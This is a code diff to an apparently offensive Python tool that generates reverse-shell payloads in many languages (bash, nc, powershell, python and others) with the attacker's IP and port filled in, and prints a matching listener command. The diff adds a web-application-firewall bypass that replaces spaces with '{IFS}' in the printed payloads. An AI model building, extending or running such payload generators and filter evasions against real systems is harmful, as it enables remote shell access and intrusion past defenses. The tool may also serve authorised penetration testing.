@@ -144,6 +144,9 @@ def getParameter():
     parser.add_argument('-ip', type=str, help='External ip address.', default=getCommandResult(GET_IP_ADDRESS[0]))
     parser.add_argument('-p', '--port', type=str, help='Port you want to reverse.', default='4444')
     parser.add_argument('-t', '--type', type=str, default='bash_tcp', help="""Type: awk, bash_tcp, bash_udp, c, dart, golang, groovy, java, lua_linux, lua_windows, ncat, nc, nc_openbsd, nc_busybox, nodejs, openssl, perl, perl_windows, php, powershell, python, python_no_space, python_ipv6, python_ipv6_no_space, python_code, ruby, ruby_windows, socat, telnet. Default: bash_tcp""")
+    parser.add_argument('-b', '--bypass', type=int, default='0', help='For bypassing waf.', nargs='?', const=1)
+    parser.add_argument('-c1', '--character1', type=str, default=' ', help='Character to replace.', nargs=None)
+    parser.add_argument('-c2', '--character2', type=str, default='{IFS}', help='Replace to new character.', nargs=None)
     args = parser.parse_args()
     return vars(args)
 
@@ -151,10 +154,16 @@ def banner():
     f = open('banner.txt', 'r')
     return f.read()
 
-def getReverseShellPayload(reverse_shell_type, ip, port):
+def bypass(bypass_type, payload, bypass_char, bypass_char2):
+    if bypass_type:
+        payload = payload.replace(bypass_char, bypass_char2)
+    else:
+        pass
+    
+    return payload
+
+def getReverseShellPayload(reverse_shell_type, ip, port, bypass_type=None, bypass_char=None, bypass_char2=None):
     reverse_shell = []
-    ip = ip
-    port = port
 
     if reverse_shell_type == 'awk':
         reverse_shell = AWK_REVERSE_SHELL
@@ -233,7 +242,7 @@ def getReverseShellPayload(reverse_shell_type, ip, port):
     print('=======================================================================================================')
     print('Your payload: ')
     for i in reverse_shell:
-        print(Color.BOLD + i.replace('IP_ADDRESS', ip).replace('PORT', port) + Color.END)
+        print(Color.BOLD + bypass(bypass_type, i, bypass_char, bypass_char2).replace('IP_ADDRESS', ip).replace('PORT', port) + Color.END)
     print('=======================================================================================================')
     print(Color.RED + "Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash")
 
@@ -243,7 +252,7 @@ def main():
     args = getParameter()
     print()
     print('Your listener:' + Color.GREEN, LISTENER[0].replace('PORT', args['port']), Color.END)
-    getReverseShellPayload(args['type'], args['ip'], args['port'])
+    getReverseShellPayload(args['type'], args['ip'], args['port'], args['bypass'], args['character1'], args['character2'])
 
 if __name__ == "__main__":
     main()
